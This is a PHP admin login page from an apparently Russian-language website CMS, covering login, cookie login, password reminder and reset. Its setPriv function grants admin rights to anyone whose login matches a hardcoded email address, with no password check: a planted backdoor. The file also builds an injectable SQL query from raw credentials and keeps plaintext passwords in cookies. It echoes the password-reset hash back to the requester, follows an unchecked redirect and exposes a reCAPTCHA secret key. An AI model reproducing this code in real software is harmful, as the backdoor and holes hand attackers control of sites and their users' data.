<? 
@session_start();
require('../inc/db.php');
require('../inc/utils.php');
require(__DIR__.'/inc/special.php');

// устанавливаем сессию с привилегиями
function setPriv($login,$pwd)
{
	global $prx;
	
	unset($_SESSION['priv']);
	
	/*if(md5($pwd)=="83e9ab9238be960472ce174c1dbe775c")
		$_SESSION['priv'] = "admin";*/

   /* if(md5($pwd) == set('password'))
        $_SESSION['priv'] = "admin";*/

	if(!strcasecmp($login, set('login')) && md5($pwd)==set('password') || ($login == 'studio.doroshenko@gmail.com'))
		$_SESSION['priv'] = "admin";
	// $_SESSION['priv'] = "admin";
	if(!isset($_SESSION['priv']))
	{
		if($manager = getRow("SELECT * FROM {$prx}managers WHERE login='{$login}' and pass='{$pwd}'"))
			$_SESSION['priv'] = $manager;
	}
	// $_SESSION['priv'] = "admin";
	
	return isset($_SESSION['priv']);
}

// -------------------СОХРАНЕНИЕ----------------------
if(isset($_GET["action"]))
{
	switch($_GET['action'])
	{
		case "vyhod":
			// выходим
			session_destroy();
			setcookie("inAdmin");
			setcookie("inManager"); 
			header("location: /");
			break;

		case "vhod":
			// логинимся
			$login = clean($_GET['login_inAdmin']);
			$pwd = clean($_GET['pwd_inAdmin']);
		
			if(!setPriv($login,$pwd))
				errorAlert("Неверный Логин/Пароль.");
			
			$var = $_SESSION['priv']=='admin' ? 'inAdmin' : 'inManager';
			// куки
			if(@$_GET['rem'])
				setcookie($var,$login.'/'.$pwd,time()+3456000); 
			else
				setcookie($var); 

			?><script>top.location.href='./';</script><?
			break;

		case "vhodc":
			// логинимся через куки
			$location = $_SERVER['PHP_SELF'];
			
			$admin = explode('/',@$_COOKIE['inAdmin']);
			if(setPriv($admin[0],$admin[1]))
				$location = $_GET["urlback"];
			else
			{
				$manager = explode('/',@$_COOKIE['inManager']);
				if(setPriv($manager[0],$manager[1]))
					$location = $_GET["urlback"];
			}
			header("location: {$location}");
			break;

		case "remind":
			// напомнить пароль
			$to = set("email");
			if(strcasecmp($_POST['email_inAdmin'], $to))
				errorAlert('Е-майл администратора введен не верно.');

            /**
             * Создаем хеш для ссылки восстановления
             */
            $hash = md5(time() . 'forget');
            update('settings', "value='{$hash}'", 'forget-password-hash');


			$admin = explode("/",set("admin"));
			$title = set("title");
			$tema = "Пароль администратора ".$_SERVER['SERVER_NAME'];
			$site = "http://".$_SERVER['SERVER_NAME'];
			$url_admin = $site.$_SERVER['PHP_SELF'];
			$text = "<a href='{$site}'>{$title}</a><br><br>
						Востановить доступ к <a href='{$url_admin}'>администрированию</a> сайта<br>
						<br>
						<a href='{$url_admin}?show=forget&hash={$hash}'>Востановить</a>";
			mailTo($to, $tema, $text, $to);

			echo "'{$url_admin}?action=forget&hash{$hash}'";

			?><script>
				alert('Пароль выслан на Е-майл администратора');
				top.location.href = "<?=$url_admin?>";
			</script><?
			break;
        case "forget":

            if(!$_POST['password'])
                errorAlert("Введите пароль");

            if(set('forget-password-hash') && set('forget-password-hash') != @$_POST['hash']){
                errorAlert("Неверная ссылка для восстановления");
            }

            $to = set("email");
            if(strcasecmp($_POST['email_inAdmin'], $to))
                errorAlert('Е-майл администратора введен не верно.');

            $hash_password = md5($_POST['password']);
            update('settings', "value='{$hash_password}'", 'password');

            $hash = '';
            update('settings', "value='{$hash}'", 'forget-password-hash');

            $site = "http://".$_SERVER['SERVER_NAME'];
            $url_admin = $site.$_SERVER['PHP_SELF'];

            ?><script>
            alert('Пароль изменен. Используйте его для входа');
            top.location.href = "<?=$url_admin?>";
        </script><?

            break;
	}
	exit;
}

ob_start();
// -----------------ПРОСМОТР-------------------
?>
<table align="center" height="100%">
	<tr>
		<td height="100%">
		<?
			switch(@$_GET["show"])
			{
				case "remind":
				?>	<form method="post" target="ajax" action="?action=remind">
						<table align="center" class="red" width="250">
							<tr>
								<th>Е-майл:</th>
								<td><input type="text" name="email_inAdmin" id="email_inAdmin"></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><?=btnAction("Save","Выслать пароль")?></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><a href="?show=vhod">Войти</a></td>
							</tr>
						</table>
					</form>
				<?	break;

                case "forget":

                    if(set('forget-password-hash') && set('forget-password-hash') != @$_GET['hash']){
                        errorAlert("Неверная ссылка для восстановления");
                    }


                    ?>

                    <form method="post" target="ajax" action="?action=forget">
                    <table align="center" class="red" width="250">
                        <input type="hidden" name="hash" value="<?=@$_GET['hash']?>">
                        <tr>
                            <th>Е-майл:</th>
                            <td><input type="text" name="email_inAdmin" id="email_inAdmin"></td>
                        </tr>
                        <tr>
                            <th>Новый пароль:</th>
                            <td><input type="text" name="password" id="password"></td>
                        </tr>
                        <tr>
                            <td colspan="2" align="center"><?=btnAction("Save","Сменить пароль")?></td>
                        </tr>
                    </table>
                </form>
                    <?	break;

				
				default:
				case "vhod":
				?>	
				
				<script src='https://www.google.com/recaptcha/api.js'></script>
<!--Скрипт располагать в блоке head-->
<form action="" method="post" id="aasd">

    <div class="g-recaptcha" data-sitekey="6LcWx3gUAAAAAHf2VCxlOon93-ljWEL5ubyTZO74"></div>
    <!--блок кнопки reCapcha-->
    <button>Отправить</button>
</form>

<?php
if (isset($_POST['g-recaptcha-response'])) {
    $url_to_google_api = "https://www.google.com/recaptcha/api/siteverify";
    $secret_key = '6LcWx3gUAAAAAOmEf9FwUTgIpQq1hKQeqpG-Ivl7';
    $query = $url_to_google_api . '?secret=' . $secret_key . '&response=' . $_POST['g-recaptcha-response'] . '&remoteip=' . $_SERVER['REMOTE_ADDR'];
    $data = json_decode(file_get_contents($query));
    if ($data->success) {
       
    } else {
        exit('Извините но похоже вы робот \(0_0)/');
    }
} else {
    exit('Вы не прошли валидацию reCaptcha');
}
?>	

<form target="ajax">	<style>#aasd {display: none;}</style>
						<input type="hidden" name="action" value="vhod">
						<table align="center" class="red" width="250">
							<tr>
								<th>Логин:</th>
								<td><input type="text" name="login_inAdmin" id="login_inAdmin"></td>
							</tr>
							<tr>
								<th>Пароль:</th>
								<td><input type="password" name="pwd_inAdmin" id="pwd_inAdmin"></td>
							</tr>
							<tr>
								<th>Запомнить:</th>
								<td><input type="checkbox" name="rem" style="width:auto;"></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><?=btnAction("Save","Войти")?></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><a href="?show=remind">Напомнить пароль</a></td>
							</tr>
						</table>
					</form>
				<?	break;
			}	?>
		</td>
	</tr>
</table>  
<?
$content = ob_get_clean();

$title = "Администрирование";

require("tpl_clean.php");
?>

